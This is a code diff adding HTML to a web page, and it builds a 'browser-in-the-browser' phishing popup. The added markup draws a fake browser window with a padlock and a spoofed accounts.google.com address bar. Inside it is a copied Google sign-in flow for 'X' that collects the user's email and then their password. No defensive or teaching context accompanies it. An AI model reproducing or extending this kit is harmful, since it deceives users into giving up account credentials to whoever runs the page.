@@ -162,5 +162,100 @@
       </div>
     </section>
   </main>
+
+  <!-- GOOGLE VIEW -->
+  
+  <!-- ULTRA-REALISTIC BITB POPUP -->
+  <div class="overlay hidden" id="overlay"></div>
+
+  <div class="bitb-window hidden" id="bitb-window" role="dialog" aria-modal="true">
+    <div class="bitb-titlebar" id="bitb-titlebar">
+      <div class="address-bar">
+        <svg class="lock-icon" viewBox="0 0 16 16" width="13" height="13"><path fill="currentColor" d="M8 1a4 4 0 0 0-4 4v2H3a1 1 0 0 0-1 1v6a1 1 0 0 0 1 1h10a1 1 0 0 0 1-1V8a1 1 0 0 0-1-1h-1V5a4 4 0 0 0-4-4zm2.5 6h-5V5a2.5 2.5 0 0 1 5 0v2z"/></svg>
+        <span class="url-text" id="fake-url">https://accounts.google.com/o/oauth2/auth/identifier</span>
+      </div>
+      <div class="win-controls">
+        <div class="win-btn win-minimize" id="btn-minimize">
+          <svg width="10" height="10" viewBox="0 0 10 10"><rect x="0" y="4.5" width="10" height="1" fill="currentColor"/></svg>
+        </div>
+        <div class="win-btn win-maximize" id="btn-maximize">
+          <svg width="10" height="10" viewBox="0 0 10 10"><path d="M1,1 h8 v8 h-8 z M2,2 v6 h6 v-6 z" fill="currentColor"/></svg>
+        </div>
+        <div class="win-btn win-close" id="btn-close">
+          <svg width="10" height="10" viewBox="0 0 10 10"><path d="M1.4,0 L5,3.6 L8.6,0 L10,1.4 L6.4,5 L10,8.6 L8.6,10 L5,6.4 L1.4,10 L0,8.6 L3.6,5 L0,1.4 Z" fill="currentColor"/></svg>
+        </div>
+      </div>
+    </div>
+    
+    <div id="loading-simulator" style="display: none; background: var(--g-bg-color); flex-grow: 1;"></div>
+    
+    <div class="view-container" id="view-container">
+      <div id="google-view" class="google-view-wrapper">
+
+    <div class="google-header">
+      <svg viewBox="0 0 48 48">
+        <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"></path>
+        <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"></path>
+        <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"></path>
+        <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"></path>
+      </svg>
+      <span>Sign in with Google</span>
+    </div>
+
+    <div class="google-content">
+      <div class="login-step" id="g-step-email">
+        <img src="assets/unnamed.png" alt="X Logo" style="width: 40px; height: 40px; margin-bottom: 16px; border-radius: 4px;" />
+        <h1>Sign in</h1>
+        <!-- Teks diubah ke X -->
+        <p class="ms-help-text">to continue to <a href="#" style="color: var(--g-link-color); text-decoration: none;">X</a></p>
+        <form id="g-demo-form" novalidate>
+          <div class="floating-field">
+            <input type="email" id="g-email-input" class="ms-input" placeholder=" " autocomplete="off" />
+            <label for="g-email-input">Email or phone</label>
+          </div>
+          <a href="#" class="g-forgot-link">Forgot email?</a>
+          <p class="g-disclaimer-text">Before using this app, you can review X's <a href="#">Privacy Policy</a> and <a href="#">Terms of Service</a>.</p>
+          <div class="g-btn-row">
+            <button type="button" class="g-btn g-btn-text">Create account</button>
+            <button type="submit" class="g-btn g-btn-primary">Next</button>
+          </div>
+        </form>
+      </div>
+
+      <div class="login-step hidden" id="g-step-password">
+        <h1>Welcome</h1>
+        <div class="g-user-email-chip" id="btn-back-email" title="Beralih akun">
+          <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
+          <span id="g-display-email"></span>
+          <svg viewBox="0 0 24 24" style="width:16px; height:16px; margin-left:8px;"><path d="M7 10l5 5 5-5z"/></svg>
+        </div>
+        <form id="g-password-form" novalidate>
+          <div class="floating-field">
+            <input type="password" id="g-password-input" class="ms-input" placeholder=" " autocomplete="off" />
+            <label for="g-password-input">Enter your password</label>
+          </div>
+          <a href="#" class="g-forgot-link">Forgot password?</a>
+          <div class="g-btn-row">
+            <div></div>
+            <button type="submit" class="g-btn g-btn-primary">Next</button>
+          </div>
+        </form>
+      </div>
+    </div>
+
+    <div class="google-footer">
+      <div class="g-lang-selector">
+        English (United States)
+        <svg viewBox="0 0 24 24" width="16" height="16" fill="currentColor"><path d="M7 10l5 5 5-5z"/></svg>
+      </div>
+      <div class="g-footer-links">
+        <a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a>
+      </div>
+    </div>
+  </div>
+
+    </div>
+  </div>
 </body>
+
 </html>
